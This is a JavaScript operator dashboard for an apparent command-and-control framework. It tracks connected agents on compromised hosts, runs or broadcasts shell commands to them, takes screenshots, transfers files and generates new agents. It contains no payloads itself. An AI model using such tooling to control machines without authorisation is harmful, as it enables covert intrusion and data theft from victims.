"use strict";

const State = {
    serverRunning: false,
    serverHost: "0.0.0.0",
    serverPort: 4444,
    serverAddress: "",
    sessionKey: "",
    serverStartedAt: null,
    agentList: [],
    selectedId: null,
    logs: [],
    lastLogCount: 0,
    lastScrollY: 0,
    busy: false,
    token: null,
    operator: null,
    role: null,
    isTeam: false
};

let pollTimer = null;
let clockTimer = null;
let uptimeTimer = null;
let CmdHistory = [];
let HistIdx = -1;

function LoadToken() {
    try {
        State.token = localStorage.getItem("tc2_token");
        State.operator = localStorage.getItem("tc2_operator");
        State.role = localStorage.getItem("tc2_role");
    } catch (e) {}
}

function SaveToken(token, operator, role) {
    State.token = token;
    State.operator = operator;
    State.role = role;
    try {
        localStorage.setItem("tc2_token", token);
        localStorage.setItem("tc2_operator", operator);
        localStorage.setItem("tc2_role", role);
    } catch (e) {}
}

function ClearToken() {
    State.token = null;
    State.operator = null;
    State.role = null;
    try {
        localStorage.removeItem("tc2_token");
        localStorage.removeItem("tc2_operator");
        localStorage.removeItem("tc2_role");
    } catch (e) {}
}

function AuthHdr(extra) {
    let h = Object.assign({ "Content-Type": "application/json" }, extra || {});
    if (State.token) h["Authorization"] = "Bearer " + State.token;
    return h;
}

async function Api(path, opts) {
    opts = opts || {};
    opts.headers = AuthHdr(opts.headers);
    let r = await fetch(path, opts);
    if (r.status === 401) {
        ClearToken();
        ShowLogin("Session expired");
        throw new Error("Unauthorized");
    }
    return r;
}

function Log(msg, level) {
    if (!level) level = "info";
    let ts = new Date().toLocaleTimeString("en-US", { hour12: false });
    State.logs.push({ msg, level, ts });
    if (State.logs.length > 500) State.logs = State.logs.slice(-500);
    RenderLogs();
}

function CopyText(text, btn) {
    let done = () => {
        if (!btn) return;
        let o = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i>';
        btn.disabled = true;
        setTimeout(() => {
            btn.innerHTML = o;
            btn.disabled = false;
        }, 1800);
    };
    if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard
            .writeText(text)
            .then(done)
            .catch(() => {
                FbCopy(text);
                done();
            });
    } else {
        FbCopy(text);
        done();
    }
}

function FbCopy(text) {
    let t = document.createElement("textarea");
    t.value = text;
    t.style.cssText = "position:fixed;opacity:0";
    document.body.appendChild(t);
    t.focus();
    t.select();
    try {
        document.execCommand("copy");
    } catch (e) {}
    document.body.removeChild(t);
}

function TickUptime() {
    if (!State.serverStartedAt || !State.serverRunning) return;
    let s = Math.floor(Date.now() / 1000 - State.serverStartedAt);
    let str =
        String(Math.floor(s / 3600)).padStart(2, "0") +
        ":" +
        String(Math.floor((s % 3600) / 60)).padStart(2, "0") +
        ":" +
        String(s % 60).padStart(2, "0");
    let el = document.getElementById("stat-uptime");
    if (el) el.textContent = str;
    uptimeTimer = setTimeout(TickUptime, 1000 - (Date.now() % 1000) || 1000);
}

function StartUptime() {
    if (uptimeTimer) clearTimeout(uptimeTimer);
    TickUptime();
}

function StopUptime() {
    if (uptimeTimer) {
        clearTimeout(uptimeTimer);
        uptimeTimer = null;
    }
    let el = document.getElementById("stat-uptime");
    if (el) el.textContent = "00:00:00";
}

async function DoLogin() {
    let u = (document.getElementById("li-user") || {}).value || "";
    let p = (document.getElementById("li-pass") || {}).value || "";
    let errEl = document.getElementById("li-err");
    let btn = document.getElementById("li-btn");
    if (!u || !p) {
        if (errEl) errEl.textContent = "Username and password required";
        return;
    }
    if (btn) {
        btn.disabled = true;
        btn.textContent = "Authenticating...";
    }
    try {
        let r = await fetch("/api/auth/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ Username: u, Password: p })
        });
        let d = await r.json();
        if (d.Token) {
            SaveToken(d.Token, d.Username, d.Role);
            let ov = document.getElementById("login-overlay");
            if (ov) ov.remove();
            Log("Logged in as " + d.Username + " [" + d.Role + "]", "success");
            UpdateBadge();
            await BootStatus();
        } else {
            if (errEl) errEl.textContent = d.Error || "Invalid credentials";
        }
    } catch (err) {
        if (errEl) errEl.textContent = "Connection error";
    } finally {
        if (btn) {
            btn.disabled = false;
            btn.textContent = "AUTHENTICATE";
        }
    }
}

async function DoLogout() {
    try {
        await Api("/api/auth/logout", { method: "POST" });
    } catch (e) {}
    ClearToken();
    StopPoll();
    StopUptime();
    State.serverRunning = false;
    State.agentList = [];
    State.selectedId = null;
    ShowLogin("Logged out");
}

async function ToggleServer() {
    if (State.busy) return;
    State.busy = true;
    try {
        State.serverRunning ? await StopSrv() : await StartSrv();
    } finally {
        setTimeout(() => (State.busy = false), 1500);
    }
}

async function StartSrv() {
    let h =
        (document.getElementById("input-host") || {}).value || State.serverHost;
    let p = parseInt(
        (document.getElementById("input-port") || {}).value || State.serverPort
    );
    let m = (document.getElementById("input-mode") || {}).value || "MULTI";
    State.serverHost = h;
    State.serverPort = p;
    Log("Starting server on " + h + ":" + p + " [" + m + "]...", "info");
    try {
        let r = await Api("/api/server/start", {
            method: "POST",
            body: JSON.stringify({ Host: h, Port: p, Mode: m })
        });
        let d = await r.json();
        if (d.Success) {
            State.serverRunning = true;
            State.serverAddress = d.Host + ":" + d.Port;
            State.sessionKey = d.Key || "";
            State.serverStartedAt = d.StartedAt || Date.now() / 1000;
            Log("Server started on " + State.serverAddress + " [" + (d.Mode || m) + "]", "success");
            StartPoll();
            StartUptime();
            UpdateToggleBtns();
            UpdateSphere();
            UpdateStats();
        } else {
            Log("Error: " + (d.Error || d.Message || "Unknown"), "error");
        }
    } catch (e) {
        if (e.message !== "Unauthorized")
            Log("API error: " + e.message, "error");
    }
}

async function StopSrv() {
    Log("Stopping server...", "warn");
    try {
        let r = await Api("/api/server/stop", { method: "POST" });
        let d = await r.json();
        if (d.Success) {
            State.serverRunning = false;
            State.serverAddress = "";
            State.sessionKey = "";
            State.agentList = [];
            State.selectedId = null;
            State.lastLogCount = 0;
            Log("Server stopped", "warn");
            StopPoll();
            StopUptime();
            UpdateToggleBtns();
            UpdateSphere();
            UpdateStats();
            RenderAgents();
            UpdateTargetBadge();
            DrawTopology();
        } else {
            Log("Stop error: " + (d.Error || d.Message), "error");
        }
    } catch (e) {
        if (e.message !== "Unauthorized")
            Log("API error: " + e.message, "error");
    }
}

function StartPoll() {
    if (pollTimer) clearInterval(pollTimer);
    pollTimer = setInterval(async () => {
        await PollStatus();
        await PollAgents();
        await PollLogs();
    }, 1500);
}

function StopPoll() {
    if (pollTimer) {
        clearInterval(pollTimer);
        pollTimer = null;
    }
}

async function PollStatus() {
    try {
        let d = await (await Api("/api/server/status")).json();
        if (d.Status === "Online") {
            State.serverRunning = true;
            if (d.Host && d.Port) State.serverAddress = d.Host + ":" + d.Port;
            if (d.Key) State.sessionKey = d.Key;
            if (d.StartedAt && d.StartedAt !== State.serverStartedAt) {
                State.serverStartedAt = d.StartedAt;
                StartUptime();
            } else if (!State.serverStartedAt) {
                State.serverStartedAt = Date.now() / 1000;
                StartUptime();
            }
            UpdateStats();
        } else if (d.Status === "Offline" && State.serverRunning) {
            State.serverRunning = false;
            Log("Server went offline", "error");
            StopUptime();
            UpdateToggleBtns();
            UpdateSphere();
            UpdateStats();
        }
    } catch (e) {}
}

async function PollAgents() {
    try {
        let d = await (await Api("/api/agents")).json();
        let agents = d.Agents || [];
        let cur = new Set(State.agentList.map(a => a.ID));
        let nxt = new Set(agents.map(a => a.ID));
        agents.forEach(a => {
            if (!cur.has(a.ID)) {
                let name = a.DisplayName || a.AgentName || "AGENT-" + a.ID;
                Log(
                    "Agent connected: [" +
                        name +
                        "] " +
                        (a.AgentIP || "") +
                        " key=" +
                        (a.SessionKey || "—"),
                    "success"
                );
            }
        });
        State.agentList = agents;
        RenderAgents();
        UpdateStats();
        UpdateAgentBadges();
        DrawTopology();
        if (State.selectedId && !nxt.has(State.selectedId)) {
            Log("Agent disconnected: #" + State.selectedId, "warn");
            State.selectedId = null;
            UpdateTargetBadge();
        }
    } catch (e) {}
}

async function PollLogs() {
    try {
        let d = await (await Api("/api/logs")).json();
        let svl = d.Logs || [];
        if (svl.length > State.lastLogCount) {
            svl.slice(State.lastLogCount).forEach(entry => {
                let msg =
                    typeof entry === "string"
                        ? entry
                        : entry.Message || String(entry);
                Log("[SERVER] " + msg);
            });
            State.lastLogCount = svl.length;
        }
    } catch (e) {}
}

function SelectAgent(id) {
    State.selectedId = id;
    RenderAgents();
    UpdateTargetBadge();
}

function SelectAndGo(id) {
    SelectAgent(id);
    GoTo("command");
}

async function KillAgent(id) {
    if (!confirm("Kill session " + id + "?")) return;
    try {
        let r = await Api("/api/agents/kill", {
            method: "POST",
            body: JSON.stringify({ AgentId: id })
        });
        let d = await r.json();
        if (d.Success) {
            Log("Session-" + id + " killed", "warn");
            if (State.selectedId === id) {
                State.selectedId = null;
                UpdateTargetBadge();
            }
        } else {
            Log("Kill failed: " + (d.Error || d.Message), "error");
        }
    } catch (e) {
        if (e.message !== "Unauthorized")
            Log("Kill error: " + e.message, "error");
    }
}

async function executeCommand() {
    let inp = document.getElementById("cmd-input");
    let raw = inp ? inp.value.trim() : "";
    if (!raw) return;
    if (!State.selectedId) {
        AppendOutput(
            "[!] No agent selected — go to Agents and target one first",
            "err"
        );
        return;
    }
    inp.value = "";
    CmdHistory.unshift(raw);
    if (CmdHistory.length > 50) CmdHistory.pop();
    HistIdx = -1;
    AppendOutput("> " + raw, "cmd");
    try {
        let r = await Api("/api/command/execute", {
            method: "POST",
            body: JSON.stringify({
                AgentId: State.selectedId,
                Command: raw,
                Operator: State.operator || "system"
            })
        });
        let d = await r.json();
        AppendOutput(
            d.Success ? d.Output || "" : "[!] " + d.Output,
            d.Success ? "out" : "err"
        );
    } catch (e) {
        if (e.message !== "Unauthorized")
            AppendOutput("[!] " + e.message, "err");
    }
    AppendOutput("─".repeat(48), "sep");
}

function QuickCmd(cmd) {
    if (!State.selectedId) {
        AppendOutput("[!] No agent selected", "err");
        GoTo("command");
        return;
    }
    let inp = document.getElementById("cmd-input");
    if (inp) inp.value = cmd;
    executeCommand();
}

function copyOutput(btn) {
    let el = document.getElementById("terminal-output");
    if (!el) return;
    CopyText(
        Array.from(el.querySelectorAll(".term-line"))
            .map(l => l.textContent)
            .join("\n"),
        btn
    );
}

function clearOutput() {
    let el = document.getElementById("terminal-output");
    if (el) el.innerHTML = "";
}

async function downloadFile() {
    let src = (
        (document.getElementById("adv-source") || {}).value || ""
    ).trim();
    if (!State.selectedId) {
        AppendOutput("[!] No agent selected", "err");
        return;
    }
    if (!src) {
        AppendOutput("[!] Specify source path", "err");
        return;
    }
    AppendOutput("[+] Downloading: " + src, "cmd");
    try {
        let r = await Api("/api/command/execute", {
            method: "POST",
            body: JSON.stringify({
                AgentId: State.selectedId,
                Command: "download " + src,
                Operator: State.operator || "system"
            })
        });
        let d = await r.json();
        AppendOutput(
            d.Success ? d.Output : "[!] " + d.Output,
            d.Success ? "ok" : "err"
        );
    } catch (e) {
        AppendOutput("[!] Download failed", "err");
    }
}

async function uploadFile() {
    let src = (
        (document.getElementById("adv-source") || {}).value || ""
    ).trim();
    let dst = ((document.getElementById("adv-dest") || {}).value || "").trim();
    if (!State.selectedId || !src || !dst) {
        AppendOutput("[!] Select agent and provide src/dst", "err");
        return;
    }
    AppendOutput("[+] Uploading: " + src + " → " + dst, "cmd");
    try {
        let r = await Api("/api/command/execute", {
            method: "POST",
            body: JSON.stringify({
                AgentId: State.selectedId,
                Command: "upload " + dst,
                Operator: State.operator || "system"
            })
        });
        let d = await r.json();
        AppendOutput(
            d.Success ? d.Output : "[!] " + d.Output,
            d.Success ? "ok" : "err"
        );
    } catch (e) {
        AppendOutput("[!] Upload failed", "err");
    }
}

function copyLogs(btn) {
    CopyText(
        State.logs
            .map(l => "[" + l.ts + "] [" + l.level.toUpperCase() + "] " + l.msg)
            .join("\n"),
        btn
    );
}

function clearLogs() {
    State.logs = [];
    State.lastLogCount = 0;
    Api("/api/logs/clear", { method: "POST" }).catch(() => {});
    RenderLogs();
}

async function LoadTeam() {
    let c = document.getElementById("team-container");
    if (!c) return;
    try {
        let [opRes, roleRes] = await Promise.all([
            Api("/api/team/operators"),
            Api("/api/team/roles").catch(() => null)
        ]);
        let ops = (await opRes.json()).Operators || [];
        let roles = roleRes ? (await roleRes.json()).Roles || [] : [];
        c.innerHTML = RenderTeamTable(ops, roles);
    } catch (e) {
        if (e.message !== "Unauthorized") {
            c.innerHTML =
                '<div style="color:#ff4444;padding:16px;font-family:var(--mono);font-size:11px;">Error: ' +
                Esc(e.message) +
                "</div>";
        }
    }
}

async function CreateOperator() {
    let u = ((document.getElementById("new-op-user") || {}).value || "").trim();
    let p = (document.getElementById("new-op-pass") || {}).value || "";
    let r = (document.getElementById("new-op-role") || {}).value || "OPERATOR";
    if (!u || !p) {
        Log("Username and password required", "error");
        return;
    }
    if (p.length < 8) {
        Log("Password must be ≥ 8 characters", "error");
        return;
    }
    try {
        let res = await Api("/api/team/operators/create", {
            method: "POST",
            body: JSON.stringify({ Username: u, Password: p, Role: r })
        });
        let d = await res.json();
        if (d.Success) {
            Log("Operator created: " + u + " [" + r + "]", "success");
            let eu = document.getElementById("new-op-user");
            let ep = document.getElementById("new-op-pass");
            if (eu) eu.value = "";
            if (ep) ep.value = "";
            LoadTeam();
        } else {
            Log("Error: " + (d.Error || d.Message), "error");
        }
    } catch (e) {
        if (e.message !== "Unauthorized") Log("Error: " + e.message, "error");
    }
}

async function KickOp(username) {
    if (!confirm("Kick operator: " + username + "?")) return;
    try {
        let r = await Api("/api/team/operators/kick", {
            method: "POST",
            body: JSON.stringify({ Username: username })
        });
        let d = await r.json();
        if (d.Success) {
            Log("Operator kicked: " + username, "warn");
            LoadTeam();
        } else Log("Error: " + (d.Error || d.Message), "error");
    } catch (e) {
        if (e.message !== "Unauthorized") Log("Error: " + e.message, "error");
    }
}

async function RunServerCmd() {
    let inp = document.getElementById("srv-cmd-input");
    let raw = inp ? inp.value.trim() : "";
    if (!raw) return;
    if (inp) inp.value = "";
    let parts = raw.match(/(?:[^\s"]+|"[^"]*")+/g) || [];
    let cmd = (parts[0] || "").toLowerCase();
    Log("[SERVER] > " + raw, "info");
    try {
        switch (cmd) {
            case "kill": {
                let id = parseInt(parts[1]);
                if (!id) {
                    Log("[!] Usage: kill <id>", "error");
                    break;
                }
                let d = await (
                    await Api("/api/agents/kill", {
                        method: "POST",
                        body: JSON.stringify({ AgentId: id })
                    })
                ).json();
                Log(
                    d.Success
                        ? "[+] Killed session-" + id
                        : "[!] " + (d.Error || "Failed"),
                    d.Success ? "success" : "error"
                );
                break;
            }
            case "sessions":
            case "agents": {
                let d = await (await Api("/api/agents")).json();
                if (!(d.Agents || []).length) {
                    Log("  ⚠ No active sessions");
                    break;
                }
                (d.Agents || []).forEach(a =>
                    Log(
                        "  #" +
                            a.ID +
                            "  " +
                            (a.DisplayName || a.AgentName || "?") +
                            "  " +
                            a.Type +
                            "  " +
                            a.User +
                            "@" +
                            a.Hostname +
                            "  " +
                            a.OS +
                            "  key=" +
                            (a.SessionKey || "—")
                    )
                );
                break;
            }
            case "status": {
                let d = await (await Api("/api/server/status")).json();
                Log(
                    "  Status:" +
                        d.Status +
                        "  Mode:" +
                        d.Mode +
                        "  Address:" +
                        d.Host +
                        ":" +
                        d.Port +
                        "  Sessions:" +
                        d.Agents +
                        "  DB:" +
                        d.DB
                );
                break;
            }
            case "exec": {
                let id = parseInt(parts[1]);
                let execCmd = parts.slice(2).join(" ");
                if (!id || !execCmd) {
                    Log("[!] Usage: exec <id> <cmd>", "error");
                    break;
                }
                let d = await (
                    await Api("/api/command/execute", {
                        method: "POST",
                        body: JSON.stringify({
                            AgentId: id,
                            Command: execCmd,
                            Operator: State.operator || "system"
                        })
                    })
                ).json();
                Log(
                    (d.Success ? "    [+] " : "    [!] ") + d.Output,
                    d.Success ? "success" : "error"
                );
                break;
            }
            case "broadcast": {
                let tgt = parts[1] || "";
                let bcmd = parts.slice(2).join(" ");
                if (!bcmd) {
                    Log("[!] Usage: broadcast <all|ids> <cmd>", "error");
                    break;
                }
                let endpoint =
                    tgt.toLowerCase() === "all"
                        ? "/api/command/broadcastall"
                        : "/api/command/broadcast";
                let body =
                    tgt.toLowerCase() === "all"
                        ? {
                              Command: bcmd,
                              Operator: State.operator || "system"
                          }
                        : {
                              AgentIds: tgt.split(",").map(Number),
                              Command: bcmd,
                              Operator: State.operator || "system"
                          };
                let d = await (
                    await Api(endpoint, {
                        method: "POST",
                        body: JSON.stringify(body)
                    })
                ).json();
                Object.entries(d.Results || {}).forEach(([id, v]) =>
                    Log(
                        "  [" +
                            id +
                            "] " +
                            (v.Success ? "✔ " : "✘ ") +
                            (v.Output || ""),
                        v.Success ? "success" : "error"
                    )
                );
                break;
            }
            case "screenshot": {
                let id = parseInt(parts[1]) || State.selectedId;
                if (!id) {
                    Log("[!] Usage: screenshot <id>", "error");
                    break;
                }
                let d = await (
                    await Api("/api/command/screenshot", {
                        method: "POST",
                        body: JSON.stringify({
                            AgentId: id,
                            Operator: State.operator || "system"
                        })
                    })
                ).json();
                Log(
                    (d.Success ? "    [+] " : "    [!] ") + d.Output,
                    d.Success ? "success" : "error"
                );
                break;
            }
            case "download":
            case "dl": {
                let id = parseInt(parts[1]);
                let path = parts.slice(2).join(" ");
                if (!id || !path) {
                    Log("[!] Usage: download <id> <remote-path>", "error");
                    break;
                }
                let d = await (
                    await Api("/api/command/download", {
                        method: "POST",
                        body: JSON.stringify({
                            AgentId: id,
                            Path: path,
                            Operator: State.operator || "system"
                        })
                    })
                ).json();
                Log(
                    (d.Success ? "    [+] " : "    [!] ") + d.Output,
                    d.Success ? "success" : "error"
                );
                break;
            }
            case "upload": {
                let id = parseInt(parts[1]);
                let local = parts[2] || "";
                let remote = parts[3] || "";
                if (!id || !local) {
                    Log(
                        "[!] Usage: upload <id> <local-path> [remote-path]",
                        "error"
                    );
                    break;
                }
                let d = await (
                    await Api("/api/command/upload", {
                        method: "POST",
                        body: JSON.stringify({
                            AgentId: id,
                            LocalPath: local,
                            RemotePath: remote,
                            Operator: State.operator || "system"
                        })
                    })
                ).json();
                Log(
                    (d.Success ? "    [+] " : "    [!] ") + d.Output,
                    d.Success ? "success" : "error"
                );
                break;
            }
            case "listopt":
            case "operators": {
                let d = await (await Api("/api/team/operators")).json();
                (d.Operators || []).forEach(op =>
                    Log(
                        "  " +
                            op.Username.padEnd(16) +
                            "  " +
                            (op.Role || "?").padEnd(10) +
                            "  " +
                            (op.LastSeen || "Never")
                    )
                );
                break;
            }
            case "history": {
                let id = parseInt(parts[1]) || 0;
                let lim = parseInt(parts[2]) || 50;
                let d = await (
                    await Api("/api/command/history", {
                        method: "POST",
                        body: JSON.stringify({ AgentId: id, Limit: lim })
                    })
                ).json();
                (d.History || []).forEach(h =>
                    Log(
                        "  [" +
                            (h.Timestamp || "") +
                            "] #" +
                            h.AgentId +
                            " " +
                            (h.Operator || "?") +
                            " » " +
                            h.Command
                    )
                );
                break;
            }
            case "chathistory": {
                let d = await (
                    await Api("/api/team/chat/logs", {
                        method: "POST",
                        body: JSON.stringify({ Limit: 50 })
                    })
                ).json();
                (d.Logs || []).forEach(m =>
                    Log(
                        "  [" +
                            (m.Timestamp || "") +
                            "] " +
                            (m.From || "?") +
                            " → " +
                            (m.To || "all") +
                            ": " +
                            (m.Message || "")
                    )
                );
                break;
            }
            case "agentgen":
            case "genagent": {
                let agId = parts[1] || "agent-" + Date.now();
                let agHost = parts[2] || "";
                let agPort = parseInt(parts[3]) || 0;
                let agLang = parts[4] || "java";
                let agMtls = (parts[5] || "").toLowerCase() === "mtls";
                let body = { AgentId: agId, Lang: agLang, Mtls: agMtls };
                if (agHost) body.Host = agHost;
                if (agPort) body.Port = agPort;
                let d = await (
                    await Api("/api/agent/gen", {
                        method: "POST",
                        body: JSON.stringify(body)
                    })
                ).json();
                if (d.Success) {
                    Log("[+] Agent generated: " + d.AgentId, "success");
                    Log("    Output: " + d.OutputDir);
                    Log("    Files: " + (d.Files || []).join(", "));
                } else Log("[!] " + d.Error, "error");
                break;
            }
            case "logs": {
                let d = await (await Api("/api/logs")).json();
                (d.Logs || []).slice(-30).forEach(l => Log("  " + l));
                break;
            }
            case "help": {
                Log("  Available commands:");
                [
                    "sessions/agents",
                    "exec <id> <cmd>",
                    "broadcast <all|ids> <cmd>",
                    "kill <id>",
                    "screenshot <id>",
                    "download <id> <path>",
                    "upload <id> <local> [remote]",
                    "status",
                    "history [id] [limit]",
                    "listopt",
                    "chathistory",
                    "agentgen <id> [host] [port] [lang] [mtls]",
                    "logs",
                    "help"
                ].forEach(c => Log("    " + c));
                break;
            }
            default:
                Log(
                    "[!] Unknown: " + cmd + " — type 'help' for commands",
                    "error"
                );
        }
    } catch (e) {
        if (e.message !== "Unauthorized") Log("[!] " + e.message, "error");
    }
}

async function BootStatus() {
    try {
        let d = await (await Api("/api/server/status")).json();
        if (d.Status === "Online") {
            State.serverRunning = true;
            State.serverHost = d.Host;
            State.serverPort = d.Port;
            State.serverAddress = d.Host + ":" + d.Port;
            State.sessionKey = d.Key || "";
            State.serverStartedAt = d.StartedAt || null;
            UpdateToggleBtns();
            UpdateSphere();
            UpdateStats();
            StartPoll();
            if (State.serverStartedAt) StartUptime();
            Log("Connected to server at " + State.serverAddress, "success");
        }
    } catch (e) {}
    DrawTopology();
    GoTo("dashboard");
}

document.addEventListener("DOMContentLoaded", async () => {
    TickClock();
    clockTimer = setInterval(TickClock, 1000);
    RenderQuickCmds();
    RenderLogs();
    UpdateTargetBadge();
    InitBottomNavScroll();

    document
        .querySelectorAll("[data-nav]")
        .forEach(el =>
            el.addEventListener("click", () => GoTo(el.dataset.nav))
        );

    ["topbar-server-btn", "mobile-server-btn", "server-toggle-btn"].forEach(
        id => {
            let el = document.getElementById(id);
            if (el) el.addEventListener("click", ToggleServer);
        }
    );

    let ci = document.getElementById("cmd-input");
    if (ci) {
        ci.addEventListener("keydown", e => {
            if (e.key === "Enter") {
                executeCommand();
                return;
            }
            if (e.key === "ArrowUp") {
                HistIdx = Math.min(HistIdx + 1, CmdHistory.length - 1);
                ci.value = CmdHistory[HistIdx] || "";
            }
            if (e.key === "ArrowDown") {
                HistIdx = Math.max(HistIdx - 1, -1);
                ci.value = HistIdx < 0 ? "" : CmdHistory[HistIdx];
            }
        });
    }

    let si = document.getElementById("srv-cmd-input");
    if (si)
        si.addEventListener("keydown", e => {
            if (e.key === "Enter") RunServerCmd();
        });

    let isTeam = false;
    try {
        let probe = await fetch("/api/auth/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: "{}"
        });
        isTeam = probe.status !== 404;
    } catch (e) {}

    State.isTeam = isTeam;
    if (isTeam) {
        LoadToken();
        UpdateBadge();
        if (!State.token) {
            ShowLogin();
            return;
        }
        try {
            let r = await fetch("/api/server/status", {
                headers: { Authorization: "Bearer " + State.token }
            });
            if (r.status === 401) {
                ClearToken();
                ShowLogin("Session expired");
                return;
            }
        } catch (e) {}
    }
    await BootStatus();
});
